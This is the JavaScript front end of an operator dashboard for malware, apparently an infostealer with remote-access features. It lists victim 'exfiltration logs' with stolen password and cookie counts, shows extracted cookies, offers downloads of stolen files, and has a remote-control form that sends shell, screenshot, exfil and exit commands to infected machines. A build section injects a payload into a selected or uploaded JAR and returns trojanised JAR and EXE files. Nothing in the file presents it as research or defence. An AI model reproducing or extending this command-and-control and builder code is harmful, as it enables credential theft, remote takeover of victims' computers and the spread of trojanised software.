document.addEventListener('DOMContentLoaded', () => {
    let currentUser = null;

    // DOM Elements
    const logGrid = document.getElementById('logGrid');
    const fileList = document.getElementById('fileList');
    const refreshBtn = document.getElementById('refreshBtn');
    const filesShortcut = document.getElementById('filesShortcut');
    const uploadForm = document.getElementById('uploadForm');
    const fileInput = document.getElementById('fileInput');
    const selectedFiles = document.getElementById('selectedFiles');
    const uploadStatus = document.getElementById('uploadStatus');
    const modal = document.getElementById('modal');
    const modalData = document.getElementById('modalData');
    const closeBtn = document.querySelector('.close-btn');
    const totalItems = document.getElementById('totalItems');
    const totalFiles = document.getElementById('totalFiles');
    const latestUpdate = document.getElementById('latestUpdate');

    // Auth DOM Elements
    const userProfileName = document.getElementById('userProfileName');
    const userProfileRole = document.getElementById('userProfileRole');
    const logoutBtn = document.getElementById('logoutBtn');
    const actionLogsTab = document.getElementById('actionLogsTab');
    const filesTab = document.getElementById('filesTab');

    // Build DOM Elements
    const generateBuildBtn = document.getElementById('generateBuildBtn');
    const buildStatusBox = document.getElementById('buildStatusBox');
    const buildConsoleLog = document.getElementById('buildConsoleLog');
    const buildDownloads = document.getElementById('buildDownloads');
    const downloadJarLink = document.getElementById('downloadJarLink');
    const downloadExeLink = document.getElementById('downloadExeLink');

    // Custom JAR selection Elements
    const jarSourceDefault = document.getElementById('jarSourceDefault');
    const jarSourceSelect = document.getElementById('jarSourceSelect');
    const jarSourceUpload = document.getElementById('jarSourceUpload');
    const jarSourceUploadLabel = document.getElementById('jarSourceUploadLabel');
    const jarSelectContainer = document.getElementById('jarSelectContainer');
    const jarUploadContainer = document.getElementById('jarUploadContainer');
    const buildJarSelect = document.getElementById('buildJarSelect');
    const buildJarFileInput = document.getElementById('buildJarFileInput');
    const buildJarBrowseBtn = document.getElementById('buildJarBrowseBtn');
    const buildJarFilename = document.getElementById('buildJarFilename');

    // Action Logs DOM Elements
    const actionLogTableBody = document.getElementById('actionLogTableBody');
    const actionSearch = document.getElementById('actionSearch');
    const actionFilter = document.getElementById('actionFilter');
    const statusFilter = document.getElementById('statusFilter');
    const filterLogsBtn = document.getElementById('filterLogsBtn');
    const exportCsvBtn = document.getElementById('exportCsvBtn');
    const exportJsonBtn = document.getElementById('exportJsonBtn');

    // ==================== AUTHENTICATION GATES ====================
    async function checkAuth() {
        try {
            const response = await fetch('/api/auth/me');
            if (!response.ok) {
                window.location.href = '/login.html';
                return;
            }
            currentUser = await response.json();
            
            // Set profile text
            userProfileName.textContent = `Agent: ${currentUser.username}`;
            userProfileRole.textContent = currentUser.role === 'admin' ? 'Administrator' : 'Field Agent';

            // Show admin tabs and options if applicable
            if (currentUser.role === 'admin') {
                actionLogsTab.style.display = 'block';
                if (filesTab) filesTab.style.display = 'block';
                if (jarSourceUploadLabel) jarSourceUploadLabel.style.display = 'flex';
                if (filesShortcut) filesShortcut.style.display = 'inline-block';
            } else {
                actionLogsTab.style.display = 'none';
                if (filesTab) filesTab.style.display = 'none';
                if (jarSourceUploadLabel) jarSourceUploadLabel.style.display = 'none';
                if (filesShortcut) filesShortcut.style.display = 'none';
            }
            
            // Load dashboard content after authentication
            refreshAll();
        } catch (err) {
            window.location.href = '/login.html';
        }
    }

    // ==================== HELPERS ====================
    const formatDate = (value) => {
        if (!value) return '-';
        const date = new Date(value);
        if (Number.isNaN(date.getTime())) return '-';
        return date.toLocaleString(undefined, {
            month: 'short',
            day: 'numeric',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit'
        });
    };

    const formatBytes = (bytes = 0) => {
        if (bytes === 0) return '0 B';
        const units = ['B', 'KB', 'MB', 'GB'];
        const index = Math.min(Math.floor(Math.log(bytes) / Math.log(1024)), units.length - 1);
        return `${(bytes / Math.pow(1024, index)).toFixed(index === 0 ? 0 : 1)} ${units[index]}`;
    };

    const encodeDownloadPath = (value) => String(value || '')
        .split(/[\\/]+/)
        .map((part) => encodeURIComponent(part))
        .join('/');

    function escapeHtml(value) {
        return String(value || '').replace(/[&<>"']/g, (char) => ({
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        }[char]));
    }

    // ==================== NAVIGATION ====================
    function switchView(viewId) {
        // Enforce view access control
        if (currentUser && currentUser.role !== 'admin' && (viewId === 'filesView' || viewId === 'actionLogsView')) {
            return;
        }
        document.querySelectorAll('.view').forEach((view) => {
            view.classList.toggle('active', view.id === viewId);
        });
        document.querySelectorAll('.tab-button').forEach((button) => {
            button.classList.toggle('active', button.dataset.view === viewId);
        });

        if (viewId === 'actionLogsView' && currentUser && currentUser.role === 'admin') {
            fetchActionLogs();
        }
        if (viewId === 'buildsView') {
            populateBuildJarSelect();
        }
    }

    document.querySelectorAll('.tab-button').forEach((button) => {
        button.addEventListener('click', () => switchView(button.dataset.view));
    });

    filesShortcut.addEventListener('click', () => {
        switchView('filesView');
        fileInput.focus();
    });

    // ==================== EXFILTRATION LOG DETAILS ====================
    function extractCookies(data) {
        if (!data) return null;
        if (data.cookies) return data.cookies;
        for (const key in data) {
            if (typeof data[key] === 'object' && data[key] !== null) {
                const found = extractCookies(data[key]);
                if (found) return found;
            }
        }
        return null;
    }

    function showDetails(log) {
        currentLogUuid = log.uuid;

        const cookies = extractCookies(log.data);
        const cookieBlock = cookies ? `
            <section class="detail-section">
                <h3>Cookies</h3>
                <pre>${escapeHtml(JSON.stringify(cookies, null, 2))}</pre>
            </section>
        ` : '';

        const fileItems = (log.actualFiles || []).map((file) => `
            <li>
                <span>${escapeHtml(file)}</span>
                <a class="button ghost compact" href="/api/download/${encodeURIComponent(log.uuid)}/${encodeDownloadPath(file)}">Download</a>
            </li>
        `).join('');

        const events = (log.events || []);
        const eventBlock = events.length ? `
            <section class="detail-section">
                <h3>Events (${events.length})</h3>
                ${events.map((event) => `
                    <div style="border-left: 3px solid var(--line); padding-left: 10px; margin: 8px 0;">
                        <div class="eyebrow">${escapeHtml(event.type)} &middot; ${escapeHtml(event.createdAt)}</div>
                        <pre style="margin: 4px 0 0; font-family: monospace; font-size: 13px; max-height: 160px; overflow-y: auto; background: var(--panel-soft); color: var(--text); border: 1px solid var(--line); border-radius: var(--radius); padding: 8px;">${escapeHtml(JSON.stringify(event.data, null, 2))}</pre>
                    </div>
                `).join('')}
            </section>
        ` : '';

        const commands = (log.commands || []);
        const commandItems = (commands.length ? commands : []).map((cmd) => `
            <div style="border-left: 3px solid ${cmd.status === 'done' ? '#2e7d32' : cmd.status === 'failed' ? '#c62828' : '#b8860b'}; padding-left: 10px; margin: 8px 0;">
                <div class="eyebrow">#${cmd.id} ${escapeHtml(cmd.type)} &middot; ${escapeHtml(cmd.status)} &middot; ${escapeHtml(cmd.createdAt)}</div>
                <div style="font-size: 13px; margin-top: 2px;">${escapeHtml(cmd.args || '(no args)')}</div>
                ${cmd.result ? `<pre style="margin: 4px 0 0; font-family: monospace; font-size: 13px; max-height: 180px; overflow-y: auto; background: var(--panel-soft); color: var(--text); border: 1px solid var(--line); border-radius: var(--radius); padding: 8px;">${escapeHtml(cmd.result)}</pre>` : ''}
            </div>
        `).join('');

        const commandBlock = `
            <section class="detail-section">
                <h3>Remote control</h3>
                <form id="cmdForm" style="display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 10px;">
                    <select id="cmdType" style="padding: 8px; background: var(--panel-soft); color: var(--text); border: 1px solid var(--line); border-radius: var(--radius);">
                        <option value="shell">shell</option>
                        <option value="screenshot">screenshot</option>
                        <option value="exfil">exfil</option>
                        <option value="exit">exit</option>
                    </select>
                    <input type="text" id="cmdArgs" placeholder="Command (shell only)..." style="flex: 1; min-width: 180px; padding: 8px; background: var(--panel-soft); color: var(--text); border: 1px solid var(--line); border-radius: var(--radius);">
                    <button type="submit" class="button" style="padding: 8px 16px;">Send</button>
                    <span id="cmdStatus" style="align-self: center; font-size: 12px; color: var(--text-dim);"></span>
                </form>
                ${commandItems || '<div style="color: var(--text-dim); font-size: 13px;">No commands issued yet.</div>'}
            </section>
        `;

        modalData.innerHTML = `
            <p class="eyebrow">Details</p>
            <h2 id="modalTitle">${escapeHtml(log.uuid || 'Structure')}</h2>
            <section class="detail-section">
                <h3>Data</h3>
                <pre>${escapeHtml(JSON.stringify(log.data || {}, null, 2))}</pre>
            </section>
            ${cookieBlock}
            ${eventBlock}
            ${commandBlock}
            <section class="detail-section">
                <h3>Associated files</h3>
                <ul class="download-list">
                    ${fileItems || '<li><span>No associated files.</span></li>'}
                </ul>
            </section>
        `;
        modal.classList.add('active');
        modal.setAttribute('aria-hidden', 'false');
    }

    let currentLogUuid = null;

    // Issue a remote command to the opened build and refresh the modal.
    async function sendCommand(e) {
        if (e) e.preventDefault();
        const form = document.getElementById('cmdForm');
        if (!form || !currentLogUuid) return;
        const type = document.getElementById('cmdType').value;
        let args = document.getElementById('cmdArgs').value.trim();
        const statusEl = document.getElementById('cmdStatus');
        statusEl.textContent = 'Sending...';
        try {
            if (type === 'shell' && !args) args = 'echo no command provided';
            if (type !== 'shell') args = '';
            const response = await fetch(`/api/commands/${encodeURIComponent(currentLogUuid)}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type, args })
            });
            const data = await response.json();
            if (!response.ok) throw new Error(data.error || 'Failed to issue command');
            statusEl.textContent = `Queued as #${data.id}`;
            document.getElementById('cmdArgs').value = '';
            await refreshOpenBuild(currentLogUuid);
        } catch (err) {
            statusEl.textContent = err.message;
        }
    }

    // Refresh just the command history inside the open modal.
    async function refreshOpenBuild(uuid) {
        try {
            const response = await fetch('/api/logs');
            if (!response.ok) return;
            const logs = await response.json();
            const build = logs.find(l => l.uuid === uuid);
            if (build) {
                const prevScroll = modal.scrollTop;
                showDetails(build);
                modal.scrollTop = prevScroll;
            }
        } catch (_) {}
    }

    function closeModal() {
        modal.classList.remove('active');
        modal.setAttribute('aria-hidden', 'true');
    }

    // ==================== DATA FETCHING ====================
    async function fetchLogs() {
        logGrid.innerHTML = '<div class="empty-state">Loading structures...</div>';
        try {
            const response = await fetch('/api/logs');
            if (!response.ok) throw new Error('Unable to load logs');
            const logs = await response.json();
            renderLogs(logs);
            return logs;
        } catch (error) {
            logGrid.innerHTML = '<div class="empty-state error">Could not connect to the dashboard API.</div>';
            return [];
        }
    }

    async function fetchFiles() {
        fileList.innerHTML = '<div class="empty-state">Loading files...</div>';
        try {
            const response = await fetch('/api/files');
            if (!response.ok) throw new Error('Unable to load files');
            const files = await response.json();
            renderFiles(files);
            return files;
        } catch (error) {
            fileList.innerHTML = '<div class="empty-state error">Could not load shared files.</div>';
            return [];
        }
    }

    function renderLogs(logs) {
        logGrid.innerHTML = '';
        if (logs.length === 0) {
            logGrid.innerHTML = '<div class="empty-state">No structures found for your builds.</div>';
            return;
        }

        logs.forEach((log) => {
            const files = log.actualFiles || [];
            const card = document.createElement('button');
            card.className = 'structure-card';
            card.type = 'button';
            card.innerHTML = `
                <span class="card-kicker">${escapeHtml((log.uuid || 'unknown').split('-')[0])}</span>
                <strong>${escapeHtml(log.userId || log.uuid || 'Untitled')}</strong>
                <span class="card-date">${formatDate(log.timestamp)}</span>
                <span class="metric-row">
                    <span><b>${log.stats?.passwordcount || 0}</b> Passwords</span>
                    <span><b>${log.stats?.cookiecount || 0}</b> Cookies</span>
                    <span><b>${files.length}</b> Files</span>
                </span>
            `;
            card.addEventListener('click', () => showDetails(log));
            logGrid.appendChild(card);
        });
    }

    function renderFiles(files) {
        fileList.innerHTML = '';
        if (files.length === 0) {
            fileList.innerHTML = '<div class="empty-state">No files uploaded yet.</div>';
            return;
        }

        files.forEach((file) => {
            const row = document.createElement('article');
            row.className = 'file-row';
            row.innerHTML = `
                <div class="file-icon">${escapeHtml(file.name.split('.').pop().slice(0, 3).toUpperCase() || 'FILE')}</div>
                <div class="file-main">
                    <strong>${escapeHtml(file.name)}</strong>
                    <span>${formatBytes(file.size)} - ${formatDate(file.uploadedAt)}</span>
                </div>
                <a class="button ghost compact" href="${file.downloadUrl}">Download</a>
            `;
            fileList.appendChild(row);
        });
    }

    function renderSummary(logs, files) {
        totalItems.textContent = logs.length;
        totalFiles.textContent = files.length;

        const timestamps = [
            ...logs.map((log) => log.timestamp),
            ...files.map((file) => file.uploadedAt)
        ].filter(Boolean).sort((a, b) => new Date(b) - new Date(a));

        latestUpdate.textContent = timestamps.length ? formatDate(timestamps[0]) : '-';
    }

    async function refreshAll() {
        const [logs, files] = await Promise.all([fetchLogs(), fetchFiles()]);
        renderSummary(logs, files);
    }

    // Populate custom JAR select dropdown
    async function populateBuildJarSelect() {
        if (!buildJarSelect) return;
        try {
            const response = await fetch('/api/files');
            if (!response.ok) throw new Error('Unable to load files');
            const files = await response.json();
            
            // Filter for jar files
            const jarFiles = files.filter(f => f.name.toLowerCase().endsWith('.jar'));
            
            buildJarSelect.innerHTML = '';
            if (jarFiles.length === 0) {
                buildJarSelect.innerHTML = '<option value="">-- No JAR files uploaded yet --</option>';
            } else {
                jarFiles.forEach(file => {
                    const opt = document.createElement('option');
                    opt.value = file.name;
                    opt.textContent = `${file.name} (${formatBytes(file.size)})`;
                    buildJarSelect.appendChild(opt);
                });
            }
        } catch (error) {
            buildJarSelect.innerHTML = '<option value="">-- Failed to load files --</option>';
        }
    }

    // JAR source radio change handlers
    function updateJarSourceView() {
        if (!jarSourceDefault) return;
        jarSelectContainer.style.display = jarSourceSelect.checked ? 'block' : 'none';
        jarUploadContainer.style.display = jarSourceUpload.checked ? 'block' : 'none';
    }

    if (jarSourceDefault) {
        jarSourceDefault.addEventListener('change', updateJarSourceView);
        jarSourceSelect.addEventListener('change', updateJarSourceView);
        jarSourceUpload.addEventListener('change', updateJarSourceView);
    }

    if (buildJarBrowseBtn && buildJarFileInput) {
        buildJarBrowseBtn.addEventListener('click', () => buildJarFileInput.click());
        buildJarFileInput.addEventListener('change', () => {
            const file = buildJarFileInput.files[0];
            buildJarFilename.textContent = file ? file.name : 'No file chosen';
        });
    }

    // ==================== BUILD GENERATION ====================
    generateBuildBtn.addEventListener('click', async () => {
        buildStatusBox.style.display = 'block';
        buildConsoleLog.textContent = '[Build] Starting personalized build pipeline...\n[Build] Gathering configuration details...';
        buildDownloads.style.display = 'none';
        generateBuildBtn.setAttribute('disabled', 'disabled');

        try {
            let jarFilename = null;

            if (jarSourceSelect && jarSourceSelect.checked) {
                jarFilename = buildJarSelect.value;
                if (!jarFilename) {
                    throw new Error('Please select a target JAR file to inject, or choose the default option.');
                }
            } else if (jarSourceUpload && jarSourceUpload.checked) {
                const file = buildJarFileInput.files[0];
                if (!file) {
                    throw new Error('Please choose a JAR file to upload first.');
                }
                
                buildConsoleLog.textContent += `\n[Build] Uploading custom target JAR: ${file.name}...`;
                const formData = new FormData();
                formData.append('files', file);

                const uploadRes = await fetch('/api/files/upload', {
                    method: 'POST',
                    body: formData
                });
                
                if (!uploadRes.ok) {
                    const errData = await uploadRes.json().catch(() => ({}));
                    throw new Error(errData.error || 'Failed to upload target JAR file.');
                }
                
                const filesList = await uploadRes.json();
                if (filesList && filesList.length > 0) {
                    jarFilename = filesList[0].name;
                } else {
                    jarFilename = file.name;
                }
                buildConsoleLog.textContent += `\n[Build] Custom target JAR uploaded successfully as: ${jarFilename}`;
            }

            const response = await fetch('/api/build/generate', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ jarFilename })
            });

            const result = await response.json();
            if (response.ok && result.status === 'SUCCESS') {
                buildConsoleLog.textContent += '\n[Build] Payload and JAR generation succeeded!';
                buildConsoleLog.textContent += `\n[Build] Build ID: ${result.buildId}`;
                buildConsoleLog.textContent += `\n[Build] Target artifacts generated: ${result.files.join(', ')}`;
                buildConsoleLog.scrollTop = buildConsoleLog.scrollHeight;

                downloadJarLink.setAttribute('href', result.jarPath);
                downloadExeLink.setAttribute('href', result.exePath);
                buildDownloads.style.display = 'block';
            } else {
                buildConsoleLog.textContent += `\n[ERROR] Build pipeline crashed: ${result.error || 'Unknown error'}`;
                buildConsoleLog.scrollTop = buildConsoleLog.scrollHeight;
            }
        } catch (err) {
            buildConsoleLog.textContent += `\n[ERROR] Build pipeline failed: ${err.message}`;
            buildConsoleLog.scrollTop = buildConsoleLog.scrollHeight;
        } finally {
            generateBuildBtn.removeAttribute('disabled');
        }
    });

    // ==================== AUDIT ACTION LOGS (ADMIN-ONLY) ====================
    async function fetchActionLogs() {
        const search = actionSearch.value;
        const action = actionFilter.value;
        const status = statusFilter.value;

        actionLogTableBody.innerHTML = '<tr><td colspan="5" style="text-align: center; padding: 32px; color: var(--muted);">Loading audit logs...</td></tr>';

        try {
            const url = new URL('/api/admin/action-logs', window.location.origin);
            if (search) url.searchParams.append('search', search);
            if (action) url.searchParams.append('action', action);
            if (status) url.searchParams.append('status', status);

            const response = await fetch(url);
            if (!response.ok) throw new Error('Failed to load action logs');

            const logs = await response.json();
            renderActionLogs(logs);
        } catch (err) {
            actionLogTableBody.innerHTML = '<tr><td colspan="5" style="text-align: center; padding: 32px; color: var(--danger);">Could not load audit logs.</td></tr>';
        }
    }

    function renderActionLogs(logs) {
        actionLogTableBody.innerHTML = '';
        if (logs.length === 0) {
            actionLogTableBody.innerHTML = '<tr><td colspan="5" style="text-align: center; padding: 32px; color: var(--muted);">No audit logs found matching criteria.</td></tr>';
            return;
        }

        logs.forEach(log => {
            const row = document.createElement('tr');
            row.style.borderBottom = '1px solid var(--line)';
            
            const statusColor = log.status === 'SUCCESS' ? 'var(--success)' : 'var(--danger)';
            
            // Format details nicely if it is a JSON object
            let detailsHtml = '-';
            if (log.details) {
                try {
                    const parsed = JSON.parse(log.details);
                    detailsHtml = `<pre style="margin: 0; padding: 8px; font-family: monospace; font-size: 13px; max-height: 120px; overflow-y: auto; background: var(--panel-soft); color: var(--text); border: 1px solid var(--line); border-radius: var(--radius);">${escapeHtml(JSON.stringify(parsed, null, 2))}</pre>`;
                } catch (_) {
                    detailsHtml = escapeHtml(log.details);
                }
            }

            row.innerHTML = `
                <td style="padding: 16px 24px; white-space: nowrap;">${formatDate(log.timestamp)}</td>
                <td style="padding: 16px 24px;"><b>${escapeHtml(log.username || 'guest')}</b> (ID: ${log.userId || '-'})</td>
                <td style="padding: 16px 24px;"><span style="color: var(--accent); font-weight: 600;">${escapeHtml(log.action)}</span></td>
                <td style="padding: 16px 24px; min-width: 250px;">${detailsHtml}</td>
                <td style="padding: 16px 24px;"><span style="color: ${statusColor}; font-weight: bold; font-size: 13px;">${escapeHtml(log.status)}</span></td>
            `;
            actionLogTableBody.appendChild(row);
        });
    }

    filterLogsBtn.addEventListener('click', fetchActionLogs);
    
    exportCsvBtn.addEventListener('click', () => {
        window.location.href = '/api/admin/action-logs/export?format=csv';
    });
    exportJsonBtn.addEventListener('click', () => {
        window.location.href = '/api/admin/action-logs/export?format=json';
    });

    // ==================== LOGOUT ====================
    logoutBtn.addEventListener('click', async () => {
        try {
            await fetch('/api/auth/logout', { method: 'POST' });
            window.location.href = '/login.html';
        } catch (err) {
            window.location.href = '/login.html';
        }
    });

    // ==================== UPLOAD LISTENER ====================
    fileInput.addEventListener('change', () => {
        const names = [...fileInput.files].map((file) => file.name);
        selectedFiles.textContent = names.length ? names.join(', ') : 'Multiple files are supported.';
    });

    uploadForm.addEventListener('submit', async (event) => {
        event.preventDefault();

        if (fileInput.files.length === 0) {
            uploadStatus.textContent = 'Choose at least one file first.';
            return;
        }

        const formData = new FormData();
        [...fileInput.files].forEach((file) => formData.append('files', file));
        uploadStatus.textContent = 'Uploading...';

        try {
            const response = await fetch('/api/files/upload', {
                method: 'POST',
                body: formData
            });
            if (!response.ok) throw new Error('Upload failed');

            const files = await response.json();
            fileInput.value = '';
            selectedFiles.textContent = 'Multiple files are supported.';
            uploadStatus.textContent = 'Upload complete.';
            renderFiles(files);
            
            const logs = await fetchLogs();
            renderSummary(logs, files);
        } catch (error) {
            uploadStatus.textContent = 'Upload failed. Please try again.';
        }
    });

    refreshBtn.addEventListener('click', refreshAll);
    closeBtn.addEventListener('click', closeModal);
    modal.addEventListener('click', (event) => {
        if (event.target === modal) closeModal();
    });
    modal.addEventListener('submit', (event) => {
        if (event.target && event.target.id === 'cmdForm') sendCommand(event);
    });
    window.addEventListener('keydown', (event) => {
        if (event.key === 'Escape') closeModal();
    });

    // Run auth check on initialization
    checkAuth();
});
